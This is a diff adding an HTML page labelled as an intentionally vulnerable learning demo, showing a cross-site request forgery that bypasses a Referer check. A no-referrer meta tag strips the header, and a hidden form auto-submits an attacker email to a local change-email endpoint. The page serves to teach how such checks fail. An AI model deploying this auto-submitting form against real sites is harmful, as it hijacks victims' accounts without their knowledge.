@@ -1,0 +1,24 @@
+<!-- INTENTIONALLY VULNERABLE. For learning only. Never use in a real app. -->
+<!--
+  BYPASS DEMO 2: STRIPPED REFERER HEADER
+  By specifying <meta name="referrer" content="no-referrer">, the attacker instructs the
+  victim's browser to omit the Referer header entirely from outgoing navigation requests.
+  A naive Referer check that allows requests when the header is missing will be bypassed.
+-->
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="referrer" content="no-referrer">
+    <title>Executing CSRF Bypass: No-Referrer</title>
+  </head>
+  <body>
+    <h2>Submitting change-email with stripped Referer header...</h2>
+    <form id="csrf-form" action="http://localhost:5001/api/change-email" method="POST">
+      <input type="hidden" name="email" value="hacked@evil.test">
+    </form>
+    <script>
+      document.getElementById('csrf-form').submit();
+    </script>
+  </body>
+</html>
